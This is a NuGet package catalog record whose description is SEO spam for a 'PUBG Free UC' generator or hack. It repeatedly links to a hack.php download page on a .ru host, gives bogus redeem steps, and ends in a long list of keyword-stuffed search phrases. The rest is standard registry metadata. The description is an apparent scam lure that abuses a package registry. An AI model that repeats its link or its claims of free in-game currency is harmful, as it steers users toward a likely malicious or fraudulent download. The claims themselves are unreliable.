{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.08.40/_pubg-free-uc-working-2022-version-kon.5.8.11.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "ac257ed2-30a9-4da7-8707-46664db80a61",
  "catalog:commitTimeStamp": "2022-01-29T00:08:40.3184112Z",
  "created": "2022-01-26T16:14:42.22Z",
  "description": "# _PUBG Free UC Working 2022 Version kon\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://10.bltadwin.ru/hack.php](http://10.bltadwin.ru/hack.php)\n\n\nHere is the list of the latest PUBG Mobile codes that you can redeem to get free rewards like UC, legendary outfits, weapon skins, emotes. PUBG Free Uc · Best Pubg UC Hack No ban · More like this. To receive your free PUBG Mobile UC, all you have to do is sign up for an account on Idle-Empire, answer a few paid surveys, watch videos, or complete offers.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://10.bltadwin.ru/hack.php](http://10.bltadwin.ru/hack.php)\n\nStep 1: Enter your Pubg Mobile ID! Step 2: Are you on an Apple or Android? Step 3: Amount of Pubg Mobile BP  UC. 10, 20, 30, 40, 60 1, Get Free UC  BP. Our generator is the best one for winning free uc. The problem is that person a day who have the honor of winning free uc. To be sure you earn free uc, try our pubg mobile generator on the morning or after mid-night. free pubg uc generator without verification. free pubg uc generator no human verification. free pubg uc generator app. pubg free uc generator pubg free uc generator without human verification. pubg free uc generator working. pubg free unlimited uc generator app.\n\npubg free uc hack, pubg free uc link, pubg free uc generator, pubg free uc 100 working, pubg free uc redeem code, pubg free uc 100 working 2021, pubg free uc hack link, pubg free uc hack without human verification, pubg free uc app, pubg free uc app 2021, pubg free uc app 2020, pubg free uc apk, pubg free uc app download, pubg free uc and bp, pubg free uc and royal pass, pubg free uc application, pubg free uc bgmi, pubg free uc buy, pubg free uc buy in pakistan, pubg free uc bangladesh, pubg free uc browser, pubg free uc  bp, free pubg bonuses uc, pubg download free uc browser, pubg free uc cash, pubg free uc code, pubg free uc config file, pubg free uc collect, pubg free uc claim, pubg free uc cash apk download, pubg free uc carding, pubg free uc cash mod apk, pubg free uc download, pubg free uc daily, pubg free uc dotkom, pubg mobile free uc download, pubg free uc script download, pubg free uc hack download, pubg game free uc digi helpline, pubg free uc game download, pubg free uc earn apk, pubg free uc event, pubg free uc earn, pubg free uc earning app, pubg free uc.easy, pubg free uc earn ios, pubg mobile free uc earning 2020, pubg uc free for emulator, pubg free uc free, pubg free uc file download, pubg free uc file, pubg free uc for ios, pubg uc free fire diamond, pubg free uc hack file, pubg free uc generator without human verification, pubg free uc game, pubg free uc generator 2021, pubg free uc gift, pubg free uc get, pubg free uc google play redeem code, pubg free uc global, pubg g free uc, can i get free uc in pubg, how to get discount on pubg uc, pubg free uc hack 2021, pubg free uc hack app, pubg free uc hack online, pubg free uc hack 2022, pubg free uc hack apk, pubg free uc in pakistan, pubg free uc india, pubg free uc ios, pubg free uc id, pubg free uc.in, pubg free uc in 2021, pubg free uc hack ios, pubg free uc hack iphone, i want pubg uc free, i need pubg uc free, how to earn pubg uc for free, how to get unlimited uc in pubg for free, how to get unlimited pubg uc, pubg free uc kaise le, pubg free uc kaise milegi, pubg free uc kr, pubg me free uc kaise le, pubg me free uc kaise le app, pubg mobile free uc kaise le, pubg me free uc kaise paye, pubg free uc link without human verification, pubg free uc link season 15, pubg free uc link season 14, pubg free uc link season 16, pubg free uc link season 17, pubg free uc link season 18, pubg free uc link no human verification, pubg free uc mobile, pubg free uc mod, pubg free uc midasbuy, pubg free uc myanmar, pubg free uc mode, free pubg mobile uc hack, free pubg mobile uc generator, free pubg mobile uc app, pubg me free uc, how do i get free pubg uc, pubg free uc no ban, pubg free uc no verification, pubg free uc n",
  "id": "_PUBG-Free-UC-Working-2022-Version-kon",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-28T23:47:53.92Z",
  "listed": false,
  "packageHash": "fLepCOCLZJW4fwF/WmbnBoiWNtilpBgIHSG0W/Yqn9FTRxzKBJe67kivBsTxoupCqeNRmTHT98tl1GRuJ5Puuw==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11478,
  "published": "1900-01-01T00:00:00Z",
  "requireLicenseAcceptance": false,
  "title": "_PUBG-Free-UC-Working-2022-Version-kon",
  "verbatimVersion": "5.8.11",
  "version": "5.8.11",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.08.40/_pubg-free-uc-working-2022-version-kon.5.8.11.json#wimvocmmun.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1351,
      "fullName": "wimvocmmun.nuspec",
      "length": 4444,
      "name": "wimvocmmun.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.08.40/_pubg-free-uc-working-2022-version-kon.5.8.11.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9467,
      "fullName": ".signature.p7s",
      "length": 9467,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}